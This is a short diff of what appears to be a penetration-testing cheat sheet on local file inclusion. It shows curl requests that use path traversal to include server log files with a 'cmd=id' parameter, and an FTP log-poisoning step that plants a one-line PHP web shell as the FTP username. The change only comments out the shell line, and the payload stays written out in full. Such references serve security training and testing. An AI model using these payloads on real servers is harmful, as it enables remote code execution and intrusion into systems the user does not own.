@@ -279,7 +279,7 @@ curl "http://target/page=../../../var/log/secure&cmd=id"
 ```bash
 # FTP log poisoning (inject into FTP username)
 ftp target
-Name: <?php system($_GET["cmd"]); ?>
+# Name: <?php system($_GET["cmd"]); ?>
 
 # Include FTP log
 curl "http://target/page=../../../var/log/vsftpd.log&cmd=id"
